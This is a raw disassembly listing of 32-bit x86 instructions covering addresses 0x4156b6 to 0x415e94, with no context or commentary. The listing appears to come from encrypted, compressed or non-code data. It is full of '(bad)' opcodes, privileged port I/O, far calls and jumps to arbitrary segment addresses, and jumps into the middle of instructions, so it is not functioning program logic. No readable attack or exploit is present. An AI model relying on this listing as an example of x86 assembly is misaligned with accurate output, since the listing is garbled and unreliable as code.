  4156b6:	or     DWORD PTR [edx+0x42],0xb8a345
  4156bd:	xchg   edx,eax
  4156be:	xchg   ebx,eax
  4156bf:	or     DWORD PTR [ecx-0x1222111d],ecx
  4156c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156c6:	bound  esp,QWORD PTR [edi+0x6c1b4e24]
  4156cc:	outs   dx,DWORD PTR ds:[esi]
  4156cd:	outs   dx,BYTE PTR ds:[esi]
  4156ce:	xchg   esi,eax
  4156cf:	in     eax,dx
  4156d0:	fwait
  4156d1:	xor    DWORD PTR [edx],ebx
  4156d3:	js     0x41571c
  4156d5:	cmp    eax,eax
  4156d7:	out    dx,eax
  4156d8:	inc    edx
  4156d9:	sub    esi,eax
  4156db:	gs xor eax,esi
  4156de:	push   0x4c
  4156e0:	cmp    eax,0x7ed9232f
  4156e5:	push   0xfffffff3
  4156e7:	mov    dl,0x3f
  4156e9:	sbb    DWORD PTR [eax+0x61],0xffffffeb
  4156ed:	inc    edi
  4156ee:	or     DWORD PTR [esi-0x1a6666e3],ebp
  4156f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f5:	ins    BYTE PTR es:[edi],dx
  4156f6:	mov    es,WORD PTR [eax]
  4156f8:	dec    esp
  4156f9:	call   0x59e4:0x460be0a3
  415700:	pop    ebx
  415701:	daa    
  415702:	mov    BYTE PTR [eax-0x22],dl
  415705:	jb     0x4156f7
  415707:	imul   BYTE PTR [ebp-0x78]
  41570a:	pop    eax
  41570b:	pop    ds
  41570c:	mov    BYTE PTR [edx],dl
  41570e:	xchg   esp,eax
  41570f:	jg     0x41577e
  415711:	add    ecx,ebx
  415713:	ja     0x4156e0
  415715:	pop    esi
  415716:	push   ss
  415717:	dec    edx
  415718:	sub    eax,DWORD PTR [edx+0x1b]
  41571b:	ja     0x41578b
  41571d:	xchg   edi,eax
  41571e:	pop    edi
  41571f:	cs mov ebp,esi
  415722:	jl     0x415711
  415724:	dec    esi
  415725:	lds    edx,FWORD PTR [ecx]
  415727:	cdq    
  415728:	mov    esi,0x8d7b770
  41572d:	mul    DWORD PTR [eax+ebp*8]
  415730:	adc    eax,0x536e5090
  415735:	jmp    0x415721
  415737:	mov    ds:0xdf702914,eax
  41573c:	ja     0x415720
  41573e:	sub    DWORD PTR [eax-0x2165cb4f],ecx
  415744:	jmp    0x3d5751d6
  415749:	mov    ds:0x9cedcd91,eax
  41574e:	dec    edi
  41574f:	jp     0x4156ee
  415751:	mov    edx,0xef242f0
  415756:	ds loopne 0x415781
  415759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41575a:	fidivr WORD PTR [ebp+0x2a97a82c]
  415760:	push   ss
  415761:	dec    ecx
  415762:	dec    esp
  415763:	pop    esp
  415764:	loopne 0x41572c
  415766:	ret    
  415767:	dec    ebx
  415768:	(bad)  
  41576a:	aaa    
  41576b:	xor    dl,ah
  41576d:	pushf  
  41576e:	fisttp DWORD PTR [ebx+0x60]
  415771:	fst    QWORD PTR [edx]
  415773:	adc    DWORD PTR [esp+eiz*8-0x491344d6],ecx
  41577a:	jns    0x415739
  41577c:	mov    esi,DWORD PTR [ecx]
  41577e:	push   edx
  41577f:	fisttp WORD PTR [edx+0x64a5028c]
  415785:	fidiv  DWORD PTR [eax+0x33afd5a2]
  41578b:	jg     0x415792
  41578d:	xor    al,0x8f
  41578f:	rcl    DWORD PTR [ebx],0x3b
  415792:	xor    eax,0xc0db8182
  415797:	js     0x415785
  415799:	cwde   
  41579a:	adc    al,0xd
  41579c:	in     eax,dx
  41579d:	mov    eax,0x74567015
  4157a2:	inc    edi
  4157a3:	call   0xc170303d
  4157a8:	pop    edx
  4157a9:	test   dh,bh
  4157ab:	jne    0x415792
  4157ad:	test   DWORD PTR [esi],edi
  4157af:	sbb    al,0xaa
  4157b1:	xchg   BYTE PTR [eax],al
  4157b3:	sbb    al,0x72
  4157b5:	retf   
  4157b6:	loope  0x41576d
  4157b8:	adc    BYTE PTR ds:0x9a82804c,0x89
  4157bf:	cmp    BYTE PTR [eax+0x515e7503],bh
  4157c5:	int3   
  4157c6:	es (bad) 
  4157c8:	mov    dh,0x4e
  4157ca:	popfw  
  4157cc:	mov    edi,0xc8fee394
  4157d1:	push   ds
  4157d2:	outs   dx,DWORD PTR ds:[esi]
  4157d3:	xchg   ecx,eax
  4157d4:	and    eax,0xa00416de
  4157d9:	mov    eax,ds:0x736aab0d
  4157de:	addr16 cmc 
  4157e0:	mov    ah,0x3d
  4157e2:	jge    0x4157a0
  4157e4:	pop    esp
  4157e5:	loopne 0x4157eb
  4157e7:	(bad)  
  4157e8:	rcl    BYTE PTR [edx-0x350eb2d],1
  4157ee:	sbb    edx,DWORD PTR [edi]
  4157f0:	push   es
  4157f1:	adc    BYTE PTR [esi-0x512f8622],ch
  4157f7:	inc    esp
  4157f8:	call   0x73b6af87
  4157fd:	imul   esp,eax,0x38c5ccdb
  415803:	stos   DWORD PTR es:[edi],eax
  415804:	je     0x4157cf
  415806:	hlt    
  415807:	add    edx,edx
  415809:	test   DWORD PTR [eax+0x2b],ebx
  41580c:	xchg   ebp,eax
  41580d:	xchg   edx,eax
  41580e:	(bad)  [eax-0x75]
  415811:	jge    0x4157e6
  415813:	imul   edx,DWORD PTR [edi+eax*4-0x30],0xffffffdb
  415818:	mov    ds:0xe18c4ad1,eax
  41581d:	ja     0x4157fd
  41581f:	addr16 nop
  415821:	aaa    
  415822:	inc    esp
  415823:	push   ecx
  415824:	xchg   ecx,eax
  415825:	push   edx
  415826:	add    edx,DWORD PTR [edx+0x27]
  415829:	mov    bl,0x7e
  41582b:	mov    ecx,0xec80a243
  415830:	loope  0x41589b
  415832:	mov    ch,0x47
  415834:	mov    ebx,0x5282150d
  415839:	sbb    eax,0x264e9f4
  41583e:	into   
  41583f:	(bad)  
  415840:	dec    esi
  415841:	cmp    DWORD PTR [eax+ebp*2+0x9],esp
  415845:	(bad)  
  415846:	push   0x15
  415848:	ss sti 
  41584a:	popf   
  41584b:	dec    ebx
  41584c:	add    esi,DWORD PTR [ecx+0x14]
  41584f:	cmp    al,BYTE PTR [ebx]
  415851:	call   0x635:0x7ef69aec
  415858:	sbb    edi,DWORD PTR [esi-0x7116500d]
  41585e:	popf   
  41585f:	addr16 test al,0x73
  415862:	ds clc 
  415864:	ja     0x41588a
  415866:	pushf  
  415867:	push   ecx
  415868:	dec    esi
  415869:	ins    BYTE PTR es:[edi],dx
  41586a:	or     al,0x72
  41586c:	xor    bh,BYTE PTR [ecx+0x43]
  41586f:	push   ecx
  415870:	and    dl,al
  415872:	retf   
  415873:	mov    eax,0x71fff916
  415878:	ins    BYTE PTR es:[edi],dx
  415879:	sbb    dl,BYTE PTR [edi]
  41587b:	dec    edi
  41587c:	ins    DWORD PTR es:[edi],dx
  41587d:	jmp    0xd36:0xdce00053
  415884:	and    eax,0x617bf761
  415889:	pop    edx
  41588a:	pop    esi
  41588b:	test   eax,0xbb013ed7
  415890:	into   
  415891:	popf   
  415892:	push   esp
  415893:	add    eax,0xbae6400b
  415898:	or     edx,DWORD PTR [eax]
  41589a:	cmc    
  41589b:	shl    eax,0x1a
  41589e:	sbb    BYTE PTR [eax],al
  4158a0:	and    DWORD PTR [eax+0x1b],eax
  4158a3:	or     BYTE PTR [ebx-0x46],dh
  4158a6:	mov    esi,DWORD PTR [eax-0x3d589294]
  4158ac:	cmp    cl,bh
  4158ae:	std    
  4158af:	scas   al,BYTE PTR es:[edi]
  4158b0:	push   edx
  4158b1:	pop    ds
  4158b2:	mov    DWORD PTR [edx-0x5bfcfb0d],ebp
  4158b8:	mov    edi,ebp
  4158ba:	(bad)  
  4158bb:	pop    ss
  4158bc:	neg    al
  4158be:	pop    ebx
  4158bf:	repnz pop es
  4158c1:	mov    dh,0xa9
  4158c3:	cdq    
  4158c4:	mov    edi,0xa2700d0f
  4158c9:	pop    edx
  4158ca:	inc    ecx
  4158cb:	and    al,0x4b
  4158cd:	shr    edx,1
  4158cf:	push   eax
  4158d0:	pop    esi
  4158d1:	or     bh,BYTE PTR [esi-0x22]
  4158d4:	gs xchg ecx,eax
  4158d6:	jecxz  0x415878
  4158d8:	aam    0x42
  4158da:	lahf   
  4158db:	adc    eax,0x9dc92178
  4158e0:	push   edx
  4158e1:	mov    bl,0x1f
  4158e3:	shl    ebx,cl
  4158e5:	mov    bl,0xa9
  4158e7:	imul   ebp,DWORD PTR [ecx],0xffffffcc
  4158ea:	jmp    0x415888
  4158ec:	dec    eax
  4158ed:	stc    
  4158ee:	and    BYTE PTR [ebx],dl
  4158f0:	xor    esi,DWORD PTR ds:0xea4cf3c
  4158f6:	mov    al,ds:0xdf9a0582
  4158fb:	sahf   
  4158fc:	add    BYTE PTR [ebp+0x51d57d],0xf9
  415903:	or     ebp,DWORD PTR [esi-0x4b]
  415906:	ret    0x15a6
  415909:	sar    BYTE PTR [ebx-0x37],0xd9
  41590d:	test   BYTE PTR [eax-0x7f26de05],ah
  415913:	outs   dx,BYTE PTR ds:[esi]
  415914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415915:	sbb    dh,BYTE PTR [ebp+0x69006aa0]
  41591b:	inc    ebp
  41591c:	into   
  41591d:	call   0xc073:0xdafd5e34
  415924:	in     al,dx
  415925:	push   cs
  415926:	dec    esi
  415927:	jg     0x4158c1
  415929:	or     BYTE PTR [ebp-0x7ed785a2],ch
  41592f:	add    eax,0x2edb8756
  415934:	ja     0x41598c
  415936:	mul    DWORD PTR [eax-0x3322c9b7]
  41593c:	jns    0x415905
  41593e:	inc    ebp
  41593f:	jp     0x4158c3
  415941:	add    BYTE PTR [ecx-0x440ad517],dl
  415947:	rcr    BYTE PTR [ecx+eiz*2+0x2aeaa5c1],1
  41594e:	or     ah,ch
  415950:	repnz or BYTE PTR [edi+0x7b],cl
  415954:	(bad)  
  415955:	jmp    0x415970
  415957:	sti    
  415958:	pop    edx
  415959:	loopne 0x4158de
  41595b:	aad    0x8
  41595d:	xor    ch,cl
  41595f:	sbb    eax,0xf998b522
  415964:	test   eax,0xeffa89a5
  415969:	dec    esp
  41596a:	and    al,0x74
  41596c:	popf   
  41596d:	xchg   ebp,eax
  41596e:	pushf  
  41596f:	adc    DWORD PTR [ecx-0x7e763547],ebp
  415975:	cmc    
  415976:	fsqrt  
  415978:	pop    ecx
  415979:	pushf  
  41597a:	aad    0xf6
  41597c:	inc    ecx
  41597d:	xchg   ebx,eax
  41597e:	loopne 0x41597b
  415980:	(bad)  
  415982:	dec    edx
  415983:	icebp  
  415984:	cdq    
  415985:	cmp    dh,ch
  415987:	add    DWORD PTR [edx+edi*4+0x385c86b0],edi
  41598e:	and    dl,BYTE PTR [ebp-0x2210fe2c]
  415994:	push   0xfffffff7
  415996:	mov    eax,ds:0xe1547216
  41599b:	ds mov ebx,0x9eaf945d
  4159a1:	(bad)  
  4159a2:	jg     0x415939
  4159a4:	test   al,0xe5
  4159a6:	daa    
  4159a7:	lds    edx,FWORD PTR [edx-0x20ab9f4c]
  4159ad:	adc    BYTE PTR [edx-0x16fecb3c],dh
  4159b3:	mov    bl,0xda
  4159b5:	jecxz  0x415956
  4159b7:	repnz sub BYTE PTR [edx],bl
  4159ba:	in     eax,0x0
  4159bc:	adc    edi,DWORD PTR [edi+0x4a2fae9e]
  4159c2:	pop    edx
  4159c3:	xchg   DWORD PTR [edi],esp
  4159c5:	es mov edx,esi
  4159c8:	idiv   BYTE PTR [ecx]
  4159ca:	and    ebp,DWORD PTR [eax-0x11ef4ae2]
  4159d0:	stos   BYTE PTR es:[edi],al
  4159d1:	call   0x2dfe32a7
  4159d6:	add    esi,ebx
  4159d8:	push   ds
  4159d9:	sbb    DWORD PTR [ebx-0x73],0x46
  4159dd:	adc    al,0xda
  4159df:	inc    edx
  4159e0:	mov    eax,0x1c28de87
  4159e5:	nop
  4159e6:	jns    0x415a12
  4159e8:	mov    ch,0x3b
  4159ea:	mov    dh,0x83
  4159ec:	outs   dx,BYTE PTR ds:[esi]
  4159ed:	stos   BYTE PTR es:[edi],al
  4159ee:	vmwrite esp,DWORD PTR [edi+0x520fd195]
  4159f5:	data16 (bad) 
  4159f8:	cld    
  4159f9:	icebp  
  4159fa:	or     edx,DWORD PTR [ebx-0x51]
  4159fd:	jg     0x41599b
  4159ff:	push   ss
  415a00:	pop    ecx
  415a01:	enter  0xb1ba,0xce
  415a05:	xchg   edi,eax
  415a06:	pop    ebx
  415a07:	push   edi
  415a08:	loope  0x4159f7
  415a0a:	mov    esp,0x7e84dc79
  415a0f:	lds    edx,FWORD PTR [edi]
  415a11:	cli    
  415a12:	or     DWORD PTR [edi+0x0],eax
  415a15:	cwde   
  415a16:	loopne 0x415a01
  415a18:	mov    ecx,0x13cdb2ef
  415a1d:	scas   al,BYTE PTR es:[edi]
  415a1e:	repnz cmp esp,esp
  415a21:	inc    edi
  415a22:	pop    edx
  415a23:	jl     0x4159ee
  415a25:	mov    esp,0x25e3fd28
  415a2a:	jmp    0xf4f0:0x153f09af
  415a31:	lock push ebp
  415a33:	lock jle 0x4159cc
  415a36:	mov    esi,0x82cdc7b3
  415a3b:	pop    ecx
  415a3c:	mov    ds:0x6190edb4,eax
  415a41:	xchg   edi,eax
  415a42:	or     bh,0xb9
  415a45:	adc    BYTE PTR [ebx*2-0x33a662fd],0xf
  415a4d:	mov    ds:0xe57f0257,eax
  415a52:	adc    al,BYTE PTR [esi]
  415a54:	dec    edi
  415a55:	(bad)
  415a59:	nop
  415a5a:	mov    cl,BYTE PTR [ebx-0x7b09405]
  415a60:	jo     0x415a49
  415a62:	test   al,0x7a
  415a64:	mov    dh,0x64
  415a66:	jecxz  0x415a79
  415a68:	xor    BYTE PTR [edi+0x1b],ch
  415a6b:	push   0x69
  415a6d:	lds    esi,FWORD PTR [ebp-0x5bdd71e9]
  415a73:	cdq    
  415a74:	jns    0x415a32
  415a76:	mov    ds:0xa22f94a2,eax
  415a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a7c:	repz in eax,0x42
  415a7f:	xchg   ebx,eax
  415a80:	test   al,0xd9
  415a82:	loopne 0x415a2e
  415a84:	mov    ds:0xd682109c,al
  415a89:	mov    BYTE PTR cs:[edi+0x7f392eb],dh
  415a90:	stos   BYTE PTR es:[edi],al
  415a91:	and    bl,al
  415a93:	xchg   ebp,eax
  415a94:	syscall 
  415a96:	ss inc edx
  415a98:	pop    esp
  415a99:	cld    
  415a9a:	(bad)  
  415a9b:	aad    0xb9
  415a9d:	out    dx,eax
  415a9e:	repz enter 0xdc87,0x97
  415aa3:	ins    DWORD PTR es:[edi],dx
  415aa4:	and    al,0xd6
  415aa6:	push   0x73e5888a
  415aab:	fstp   DWORD PTR [ecx]
  415aad:	inc    eax
  415aae:	repnz cdq 
  415ab0:	cmp    eax,0xb255f293
  415ab5:	mov    edx,0x5b5f1c10
  415aba:	jo     0x415afa
  415abc:	(bad)  
  415abd:	pop    ss
  415abe:	or     al,0x8d
  415ac0:	mov    BYTE PTR [edi+0x78b5a586],dh
  415ac6:	jnp    0x415af4
  415ac8:	out    0x0,al
  415aca:	aad    0x65
  415acc:	adc    DWORD PTR [ebp-0x42],esp
  415acf:	ficom  DWORD PTR [edx]
  415ad1:	add    al,0xc2
  415ad3:	fild   WORD PTR [edx+0x70f7e33d]
  415ad9:	ds jmp 0x13c6:0x5e892e01
  415ae1:	jle    0x415ac3
  415ae3:	hlt    
  415ae4:	and    eax,DWORD PTR [ebx-0x30942be5]
  415aea:	sbb    BYTE PTR [esi],bl
  415aec:	pusha  
  415aed:	mov    ecx,DWORD PTR [edi+0x37]
  415af0:	out    0xca,eax
  415af2:	mov    ecx,0x109a5f6d
  415af7:	xchg   BYTE PTR [ebx],bl
  415af9:	mov    BYTE PTR [edx+0x2297fb34],bl
  415aff:	fst    QWORD PTR [esi-0x1]
  415b02:	fidiv  WORD PTR [esi]
  415b04:	lods   al,BYTE PTR ds:[esi]
  415b05:	mov    ds:0xc8ac5681,al
  415b0a:	in     al,0x31
  415b0c:	pop    ebx
  415b0d:	push   eax
  415b0e:	mov    bh,BYTE PTR ds:0x9f79d288
  415b14:	cmp    al,0x44
  415b16:	push   edi
  415b17:	cmp    bl,al
  415b19:	pop    ebx
  415b1a:	xchg   ebp,eax
  415b1b:	jbe    0x415aa5
  415b1d:	rcl    DWORD PTR [esi],0xe9
  415b20:	adc    bl,al
  415b22:	out    0x39,al
  415b24:	or     edx,DWORD PTR [eax-0x1]
  415b27:	pop    eax
  415b28:	pop    ebp
  415b29:	std    
  415b2a:	mov    dl,0xeb
  415b2c:	mov    ?,WORD PTR [ecx]
  415b2e:	adc    eax,0x6aad1ffd
  415b33:	push   eax
  415b34:	cmp    esp,DWORD PTR ds:0xb5a5db5a
  415b3a:	fcomp  DWORD PTR [ebx+0x4f]
  415b3d:	aas    
  415b3e:	lahf   
  415b3f:	sar    DWORD PTR [edi+0x40],cl
  415b42:	cmp    eax,0x44a72782
  415b47:	test   eax,0x36091be3
  415b4c:	mov    bh,0xea
  415b4e:	mov    esp,0xb1bc3d81
  415b53:	push   0x6f
  415b55:	mov    ecx,0x715fc7ea
  415b5a:	or     bl,BYTE PTR [ebx-0x1734b80d]
  415b60:	out    0x3a,al
  415b62:	ja     0x415b05
  415b64:	test   al,0x94
  415b66:	jae    0x415bcb
  415b68:	mov    bh,ah
  415b6a:	mov    ch,BYTE PTR [esi+0x5d818736]
  415b70:	fcom   QWORD PTR [eax-0x50da7c4d]
  415b76:	int3   
  415b77:	jb     0x415b8e
  415b79:	jns    0x415b4f
  415b7b:	xchg   esp,eax
  415b7c:	popf   
  415b7d:	ins    BYTE PTR es:[edi],dx
  415b7e:	outs   dx,BYTE PTR ds:[esi]
  415b7f:	imul   esi,DWORD PTR [ebp+0x43],0x1dcb2643
  415b86:	push   edx
  415b87:	test   eax,esi
  415b89:	dec    edi
  415b8a:	mov    bl,0xaf
  415b8c:	out    0xbe,eax
  415b8e:	inc    esp
  415b8f:	jno    0x415b6d
  415b91:	lock imul ebx,DWORD PTR [ebx-0x73],0x6cb800bd
  415b99:	jmp    0x9cbeae44
  415b9e:	push   edx
  415b9f:	repnz and eax,0x90488d7b
  415ba5:	adc    bh,BYTE PTR [edx-0x2f255ee3]
  415bab:	mov    ebx,0x6990e114
  415bb0:	(bad)  
  415bb1:	js     0x415c2d
  415bb3:	in     eax,0x6f
  415bb5:	scas   al,BYTE PTR es:[edi]
  415bb6:	inc    ebp
  415bb7:	aad    0xc6
  415bb9:	nop
  415bba:	in     al,dx
  415bbb:	xor    edx,DWORD PTR [edx-0x49256215]
  415bc1:	cld    
  415bc2:	xchg   ebx,eax
  415bc3:	jp     0x415c22
  415bc5:	pop    ss
  415bc6:	xchg   edi,eax
  415bc7:	xchg   ebx,eax
  415bc8:	push   cs
  415bc9:	push   cs
  415bca:	xchg   edx,eax
  415bcb:	push   cs
  415bcc:	push   ebp
  415bcd:	jecxz  0x415b67
  415bcf:	push   es
  415bd0:	jae    0x415c1f
  415bd2:	popf   
  415bd3:	add    DWORD PTR [edi+0x61],0xffffffb0
  415bd7:	jns    0x415b61
  415bd9:	stos   DWORD PTR es:[edi],eax
  415bda:	pushf  
  415bdb:	in     al,0x5c
  415bdd:	inc    esp
  415bde:	std    
  415bdf:	mov    dl,0xd
  415be1:	fistp  QWORD PTR [esi+0x7393a2e5]
  415be7:	in     al,dx
  415be8:	push   ebp
  415be9:	ret    0x9d5d
  415bec:	pop    ss
  415bed:	mov    ecx,DWORD PTR [ecx+0x2ac8718]
  415bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf4:	retf   
  415bf5:	and    DWORD PTR [ecx+0x55],edi
  415bf8:	cs scas al,BYTE PTR es:[edi]
  415bfa:	jno    0x415bbc
  415bfc:	add    BYTE PTR [ebp+0x28fb7b41],dh
  415c02:	sub    DWORD PTR [edx-0x54],ebx
  415c05:	int    0x59
  415c07:	ror    BYTE PTR [ebp+ebx*8-0x10],cl
  415c0b:	cdq    
  415c0c:	repz mov WORD PTR [edi],ss
  415c0f:	mov    ds,WORD PTR [ebp-0x4a849a40]
  415c15:	xchg   ebp,eax
  415c16:	fucomp st(2)
  415c18:	clc    
  415c19:	pop    es
  415c1a:	add    BYTE PTR [eax-0x68ed8dfd],ah
  415c20:	adc    esp,esi
  415c22:	ss aas 
  415c24:	sbb    al,0x65
  415c26:	daa    
  415c27:	mov    edx,0x45caf867
  415c2c:	sbb    BYTE PTR [esi+0x6c],cl
  415c2f:	sub    BYTE PTR [esi-0x43d9e859],bl
  415c35:	cmp    ch,BYTE PTR [edx-0x750d2811]
  415c3b:	push   cs
  415c3c:	pop    eax
  415c3d:	push   esp
  415c3e:	fimul  WORD PTR [eax-0x165e5ebd]
  415c44:	mov    bh,0xe8
  415c46:	dec    ebp
  415c47:	mov    bh,0x49
  415c49:	fidivr DWORD PTR [ecx-0x22c22f62]
  415c4f:	pop    edx
  415c50:	lods   al,BYTE PTR ds:[esi]
  415c51:	jo     0x415c89
  415c53:	out    dx,al
  415c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c55:	adc    ebp,DWORD PTR [edx+0x63]
  415c58:	fdiv   DWORD PTR [ecx+0x329780ef]
  415c5e:	nop
  415c5f:	jg     0x415c4c
  415c61:	(bad)  [eax+0x31]
  415c64:	popf   
  415c65:	ins    DWORD PTR es:[edi],dx
  415c66:	mov    al,0xca
  415c68:	or     ecx,edx
  415c6a:	fadd   st(1),st
  415c6c:	repz jmp 0x6ea3b44d
  415c72:	mov    al,ds:0xec5bc2e1
  415c77:	inc    ecx
  415c78:	js     0x415c7d
  415c7a:	jg     0x415c9d
  415c7c:	adc    al,0xa7
  415c7e:	sbb    DWORD PTR [edx-0x2ad4bb24],edi
  415c84:	pop    es
  415c85:	and    BYTE PTR [edx-0x43],dl
  415c88:	and    eax,DWORD PTR [ebx+0x51]
  415c8b:	xlat   BYTE PTR ds:[ebx]
  415c8c:	dec    esp
  415c8d:	push   0x4e8992a9
  415c92:	out    dx,al
  415c93:	retf   0x42b4
  415c96:	push   ebp
  415c97:	cmp    esi,DWORD PTR [edx+0x4015a710]
  415c9d:	and    DWORD PTR [esi],eax
  415c9f:	sti    
  415ca0:	mov    ds:0xb1590764,eax
  415ca5:	or     BYTE PTR [ecx-0x2a],bh
  415ca8:	test   DWORD PTR ss:[edx],eax
  415cab:	and    ecx,DWORD PTR [edx]
  415cad:	ins    BYTE PTR es:[edi],dx
  415cae:	fild   QWORD PTR [eax-0x379e0236]
  415cb4:	cdq    
  415cb5:	(bad)  
  415cb6:	mov    ebx,0xca997d4a
  415cbb:	daa    
  415cbc:	shl    ebp,0x2e
  415cbf:	lds    ebx,FWORD PTR [ebx-0x24a3653b]
  415cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc6:	pushf  
  415cc7:	loop   0x415cc1
  415cc9:	mov    ds:0xbba29225,eax
  415cce:	stc    
  415ccf:	or     al,0x47
  415cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cd2:	jae    0x415cc8
  415cd4:	aam    0xfb
  415cd6:	pushf  
  415cd7:	add    dh,cl
  415cd9:	repnz xchg edx,eax
  415cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cdc:	mov    edi,DWORD PTR [ebx+0x5d77df37]
  415ce2:	pop    ecx
  415ce3:	xor    al,BYTE PTR [ebx+0x24]
  415ce6:	test   eax,0x336242c0
  415ceb:	or     ch,BYTE PTR [ebx-0x1fc68d3a]
  415cf1:	fwait
  415cf2:	mov    ebp,ebx
  415cf4:	neg    BYTE PTR [esi+0x7d701aa3]
  415cfa:	imul   ecx,esp,0xffffff88
  415cfd:	test   BYTE PTR [ecx],al
  415cff:	dec    eax
  415d00:	xor    DWORD PTR ds:0x495d5dc1,eax
  415d06:	add    ch,BYTE PTR [eax]
  415d08:	rol    ch,cl
  415d0a:	loopne 0x415d74
  415d0c:	mov    ds:0x6b1defee,eax
  415d11:	sub    al,0xf
  415d13:	aam    0x31
  415d15:	je     0x415d48
  415d17:	xchg   edx,eax
  415d18:	cs ja  0x415cba
  415d1b:	jno    0x415cd7
  415d1d:	mov    esp,0xe4d5c85
  415d22:	mov    bh,0x3e
  415d24:	lds    esp,FWORD PTR [ebx+0xb]
  415d27:	pop    ecx
  415d28:	cmp    al,0x81
  415d2a:	mov    ds:0xe963b535,al
  415d2f:	jmp    0x1a9416c9
  415d34:	pop    ebp
  415d35:	push   ebp
  415d36:	(bad)  [edi+0x329e09ab]
  415d3c:	test   al,0x1
  415d3e:	hlt    
  415d3f:	cwde   
  415d40:	(bad)  [ecx+0x2392144d]
  415d46:	pop    esi
  415d47:	adc    eax,0xf12e6541
  415d4c:	sbb    bh,BYTE PTR [eax-0x73]
  415d4f:	lock push ebp
  415d51:	lods   eax,DWORD PTR ds:[esi]
  415d52:	jae    0x415db1
  415d54:	scas   eax,DWORD PTR es:[edi]
  415d55:	mov    BYTE PTR ds:[edx+0x55047954],ch
  415d5c:	mov    eax,0x9076c2e5
  415d61:	loop   0x415db9
  415d63:	sbb    ebx,0x7295edbe
  415d69:	jbe    0x415ddb
  415d6b:	and    DWORD PTR [edi+0x760eecff],ebp
  415d71:	mov    fs,WORD PTR [ecx+0x6e]
  415d74:	or     eax,0x7a3bd4ca
  415d79:	push   edi
  415d7a:	mov    bl,dl
  415d7c:	sub    eax,0xf7749a01
  415d81:	lea    ebp,[edx-0x1d72453]
  415d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d88:	cld    
  415d89:	imul   ebx,DWORD PTR [eax-0x70],0x6921b867
  415d90:	xchg   ebx,eax
  415d91:	fs cs push ds
  415d94:	adc    dl,BYTE PTR [edi+0x5d5e4683]
  415d9a:	push   es
  415d9b:	xchg   BYTE PTR [eax-0x33],dl
  415d9e:	ficomp DWORD PTR [esi+0x163dfb17]
  415da4:	aas    
  415da5:	mov    al,0xa4
  415da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415da8:	jbe    0x415d36
  415daa:	pop    ebx
  415dab:	push   esi
  415dac:	sbb    eax,0xcc0c917b
  415db1:	mov    eax,0xfdf0e344
  415db6:	iret   
  415db7:	out    dx,eax
  415db8:	shl    DWORD PTR [ecx-0x632775c9],cl
  415dbe:	cwde   
  415dbf:	add    ch,BYTE PTR [edx+0x4e5e4c6d]
  415dc5:	pusha  
  415dc6:	fldenv [ebx+edx*4]
  415dc9:	icebp  
  415dca:	xchg   edi,eax
  415dcb:	outs   dx,DWORD PTR ds:[esi]
  415dcc:	jb     0x415d72
  415dce:	ret    
  415dcf:	sub    DWORD PTR [ebp+0x24fff4ee],0xd3a763dc
  415dd9:	shl    BYTE PTR [ebp+0x51],0xd1
  415ddd:	popf   
  415dde:	inc    ebx
  415ddf:	cld    
  415de0:	push   esp
  415de1:	js     0x415df0
  415de3:	inc    ebp
  415de4:	pop    eax
  415de5:	mov    ebp,0x340a762a
  415dea:	cmp    al,0x1f
  415dec:	push   ds
  415ded:	int3   
  415dee:	and    BYTE PTR [ebp-0x6022b9c0],0x7a
  415df5:	jg     0x415dd0
  415df7:	adc    ecx,DWORD PTR [ebp-0x4a514576]
  415dfd:	sub    al,0xee
  415dff:	or     eax,0xb57e7f39
  415e04:	enter  0xd3a3,0x28
  415e08:	xor    ch,cl
  415e0a:	sub    DWORD PTR [ecx+0x30],ecx
  415e0d:	xchg   edi,eax
  415e0e:	imul   ebp,DWORD PTR [esi],0xffffff85
  415e11:	jo     0x415e14
  415e13:	out    0xa5,eax
  415e15:	rol    BYTE PTR [edi-0x2],0xe4
  415e19:	mul    eax
  415e1b:	aas    
  415e1c:	jl     0x415db2
  415e1e:	rcl    BYTE PTR [esp+eiz*2],cl
  415e21:	adc    DWORD PTR ds:0xce5dc1d5,esp
  415e27:	nop
  415e28:	test   BYTE PTR [esi+0x1],bl
  415e2b:	adc    ah,BYTE PTR [edi]
  415e2d:	in     eax,0x24
  415e2f:	data16 mov ds:0xa89440d6,al
  415e35:	ins    BYTE PTR es:[edi],dx
  415e36:	cdq    
  415e37:	push   ebx
  415e38:	out    0x4e,al
  415e3a:	mov    al,ds:0x141aa920
  415e3f:	ins    DWORD PTR es:[edi],dx
  415e40:	pushf  
  415e41:	(bad)  
  415e42:	xor    esi,esp
  415e44:	push   eax
  415e45:	js     0x415ea6
  415e47:	fs (bad) 
  415e49:	pusha  
  415e4a:	pop    edi
  415e4b:	push   eax
  415e4c:	lods   eax,DWORD PTR ds:[esi]
  415e4d:	outs   dx,DWORD PTR ds:[esi]
  415e4e:	jbe    0x415ec9
  415e50:	cli    
  415e51:	mov    bh,0x55
  415e53:	jmp    0xea722cf
  415e58:	gs pop es
  415e5a:	adc    eax,0x88750782
  415e5f:	loop   0x415e16
  415e61:	and    eax,0x72d4fba8
  415e66:	jne    0x415e1c
  415e68:	xor    DWORD PTR [ebp+0x1d6e941e],eax
  415e6e:	dec    esp
  415e6f:	cmp    ebx,DWORD PTR [ebp-0x70]
  415e72:	or     dl,BYTE PTR [edi]
  415e74:	pop    edx
  415e75:	ret    0x925b
  415e78:	mov    ch,0x77
  415e7a:	xchg   DWORD PTR [esi],ebx
  415e7c:	pusha  
  415e7d:	scas   al,BYTE PTR es:[edi]
  415e7e:	(bad)  
  415e7f:	cmp    DWORD PTR [ebx-0x599c7087],edi
  415e85:	mov    edx,ecx
  415e87:	mov    edx,0x82b099cb
  415e8c:	(bad)  
  415e8d:	jno    0x415e67
  415e8f:	inc    esp
  415e90:	outs   dx,BYTE PTR ds:[esi]
  415e91:	stos   BYTE PTR es:[edi],al
  415e92:	loope  0x415ec5
  415e94:	nop
